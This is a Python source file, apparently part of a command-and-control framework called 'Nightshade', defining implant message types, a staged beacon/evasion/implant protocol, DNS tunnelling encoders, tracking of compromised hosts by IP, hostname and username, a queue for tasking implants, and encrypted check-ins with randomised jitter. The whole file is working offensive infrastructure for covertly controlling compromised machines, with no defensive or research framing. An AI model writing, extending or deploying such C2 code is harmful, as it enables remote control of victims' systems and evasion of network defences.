"""
Nightshade C2 Protocol -- message types, session management, task queue,
multi-stage protocol (Stage 0/1/2), DNS C2 message types, and base32 helpers.
Each implant uses a session ID + message-level authenticated encryption.
"""
import uuid
import time
import json
import random
import base64
from dataclasses import dataclass, field
from typing import Optional
from ..core.crypto import NightshadeCrypto


# ------------------------------------------------------------------ #
#  Protocol constants                                                  #
# ------------------------------------------------------------------ #
class MessageType:
    CHECKIN = "checkin"
    RESULT = "result"
    PING = "ping"
    TASK = "task"
    ERROR = "error"
    SESSION_INFO = "session_info"
    HEARTBEAT = "heartbeat"
    # Multi-stage types
    STAGE0 = "stage0"
    STAGE1 = "stage1"
    STAGE2 = "stage2"
    # DNS types
    DNS_CHECKIN = "dns_checkin"
    DNS_COMMAND = "dns_command"
    DNS_RESULT = "dns_result"


class StageType:
    """Multi-stage protocol stage identifiers."""
    STAGE_0_BEACON = 0
    STAGE_1_EVASION = 1
    STAGE_2_IMPLANT = 2


# ------------------------------------------------------------------ #
#  DNS payload helpers                                                 #
# ------------------------------------------------------------------ #

B32_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"


def base32_encode_dns(data: bytes) -> str:
    """
    Encode bytes to DNS-safe base32. Uses lowercase, no padding.
    DNS is case-insensitive, but lower is more common.
    """
    return base64.b32encode(data).decode().rstrip("=").lower()


def base32_decode_dns(s: str) -> bytes:
    """Decode DNS-safe base32 back to bytes."""
    s = s.upper()
    pad = 8 - (len(s) % 8)
    if pad != 8:
        s += "=" * pad
    return base64.b32decode(s)


def bytes_to_dns_label(data: bytes, max_label_len: int = 63) -> list[str]:
    """Split bytes into DNS-safe labels of max_label_len chars."""
    b32 = base32_encode_dns(data)
    labels = []
    for i in range(0, len(b32), max_label_len):
        labels.append(b32[i:i + max_label_len])
    return labels


def dns_labels_to_bytes(labels: list[str]) -> bytes:
    """Reconstruct bytes from a list of DNS labels."""
    combined = "".join(labels)
    return base32_decode_dns(combined)


def build_dns_checkin_id(session_id: str) -> str:
    """Build a DNS-safe checkin identifier from session ID."""
    raw = session_id.replace("-", "")[:16].encode("ascii")
    return base32_encode_dns(raw).lower()


def build_stage_message(stage: int, session_id: str, data: Optional[str] = None) -> str:
    """Build a multi-stage protocol message.

    Args:
        stage: Stage number (0, 1, or 2)
        session_id: Campaign session identifier
        data: Optional payload data for this stage

    Returns:
        JSON-encoded message string
    """
    msg = {
        "type": f"stage{stage}",
        "stage": stage,
        "session_id": session_id,
        "ts": time.time(),
    }
    if data is not None:
        msg["data"] = data
    return json.dumps(msg)


def parse_stage_message(msg_str: str) -> Optional[dict]:
    """Parse a multi-stage protocol message."""
    try:
        msg = json.loads(msg_str)
        if "stage" in msg and "session_id" in msg:
            return msg
        return None
    except (json.JSONDecodeError, TypeError):
        return None


# ------------------------------------------------------------------ #
#  Data models                                                         #
# ------------------------------------------------------------------ #
@dataclass
class Session:
    session_id: str
    ip: str
    hostname: str = ""
    username: str = ""
    first_seen: float = 0.0
    last_seen: float = 0.0
    checkin_count: int = 0
    status: str = "active"
    stage: int = StageType.STAGE_2_IMPLANT  # Highest stage reached
    metadata: dict = field(default_factory=dict)

    def touch(self):
        self.last_seen = time.time()
        self.checkin_count += 1

    def update_stage(self, stage: int):
        """Update the highest stage reached."""
        if stage > self.stage:
            self.stage = stage

    def to_dict(self) -> dict:
        return {
            "session_id": self.session_id,
            "ip": self.ip,
            "hostname": self.hostname,
            "username": self.username,
            "first_seen": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(self.first_seen)),
            "last_seen": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(self.last_seen)),
            "checkin_count": self.checkin_count,
            "status": self.status,
            "stage": self.stage,
            "metadata": self.metadata,
        }


@dataclass
class Task:
    task_id: str
    session_id: str
    command: str
    issued_at: float
    status: str = "pending"  # pending | delivered | complete | failed
    result: Optional[str] = None
    completed_at: Optional[float] = None

    def to_dict(self) -> dict:
        return {
            "task_id": self.task_id,
            "session_id": self.session_id,
            "command": self.command,
            "issued_at": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(self.issued_at)),
            "status": self.status,
            "result": self.result[:500] if self.result else None,
        }


# ------------------------------------------------------------------ #
#  Session manager                                                     #
# ------------------------------------------------------------------ #
class SessionManager:
    """Thread-safe session tracking and task queue."""

    def __init__(self):
        self._sessions: dict[str, Session] = {}
        self._tasks: dict[str, list[Task]] = {}  # session_id -> [Task]

    def register_session(self, session_id: str, ip: str) -> Session:
        now = time.time()
        if session_id in self._sessions:
            s = self._sessions[session_id]
            s.touch()
            s.ip = ip
            return s

        s = Session(
            session_id=session_id,
            ip=ip,
            first_seen=now,
            last_seen=now,
        )
        self._sessions[session_id] = s
        self._tasks[session_id] = []
        return s

    def get_session(self, session_id: str) -> Optional[Session]:
        return self._sessions.get(session_id)

    def update_session_metadata(self, session_id: str, **kwargs):
        s = self.get_session(session_id)
        if s:
            for k, v in kwargs.items():
                if hasattr(s, k):
                    setattr(s, k, v)
                else:
                    s.metadata[k] = v

    def update_session_stage(self, session_id: str, stage: int):
        s = self.get_session(session_id)
        if s:
            s.update_stage(stage)

    def enqueue_task(self, session_id: str, command: str) -> str:
        task_id = str(uuid.uuid4())
        task = Task(
            task_id=task_id,
            session_id=session_id,
            command=command,
            issued_at=time.time(),
        )
        if session_id not in self._tasks:
            self._tasks[session_id] = []
        self._tasks[session_id].append(task)
        return task_id

    def pop_task(self, session_id: str) -> Optional[Task]:
        tasks = self._tasks.get(session_id, [])
        active = [t for t in tasks if t.status == "pending"]
        if active:
            t = active[0]
            t.status = "delivered"
            return t
        return None

    def complete_task(self, session_id: str, result: str):
        tasks = self._tasks.get(session_id, [])
        for t in tasks:
            if t.status == "delivered":
                t.status = "complete"
                t.result = result
                t.completed_at = time.time()
                return

    def list_sessions(self) -> list[dict]:
        return [s.to_dict() for s in self._sessions.values()]

    def list_tasks(self, session_id: Optional[str] = None) -> list[dict]:
        if session_id:
            return [t.to_dict() for t in self._tasks.get(session_id, [])]
        all_tasks = []
        for sid, tasks in self._tasks.items():
            for t in tasks:
                d = t.to_dict()
                d["session_id"] = sid
                all_tasks.append(d)
        return sorted(all_tasks, key=lambda x: x["issued_at"], reverse=True)

    def get_stats(self) -> dict:
        active = sum(1 for s in self._sessions.values() if s.status == "active")
        total_tasks = sum(len(t) for t in self._tasks.values())
        stage_counts = {0: 0, 1: 0, 2: 0}
        for s in self._sessions.values():
            stage_counts[s.stage] = stage_counts.get(s.stage, 0) + 1
        return {
            "total_sessions": len(self._sessions),
            "active_sessions": active,
            "total_tasks": total_tasks,
            "pending_tasks": sum(
                1 for tlist in self._tasks.values() for t in tlist if t.status == "pending"
            ),
            "stage0_sessions": stage_counts.get(0, 0),
            "stage1_sessions": stage_counts.get(1, 0),
            "stage2_sessions": stage_counts.get(2, 0),
        }


# ------------------------------------------------------------------ #
#  Protocol helpers                                                    #
# ------------------------------------------------------------------ #
def build_checkin_payload(crypto: NightshadeCrypto, session_id: str, checkin_count: int) -> str:
    """Build an encrypted check-in message."""
    msg = json.dumps({
        "type": MessageType.CHECKIN,
        "session_id": session_id,
        "seq": checkin_count,
        "ts": time.time(),
        "jitter": random.randint(30000, 120000),  # ms until next checkin
    })
    return crypto.encrypt(msg)


def build_result_payload(crypto: NightshadeCrypto, session_id: str, task_id: str, result: str, status: str = "success") -> str:
    """Build an encrypted result message."""
    msg = json.dumps({
        "type": MessageType.RESULT,
        "session_id": session_id,
        "task_id": task_id,
        "status": status,
        "result": result,
        "ts": time.time(),
    })
    return crypto.encrypt(msg)


def build_stage_payload(crypto: NightshadeCrypto, stage: int, session_id: str, data: Optional[str] = None) -> str:
    """Build an encrypted multi-stage message."""
    msg = build_stage_message(stage, session_id, data)
    return crypto.encrypt(msg)


def parse_message(crypto: NightshadeCrypto, raw: str) -> Optional[dict]:
    """Decrypt and parse an incoming message."""
    pt = crypto.decrypt(raw)
    if pt is None:
        return None
    try:
        return json.loads(pt)
    except json.JSONDecodeError:
        return None
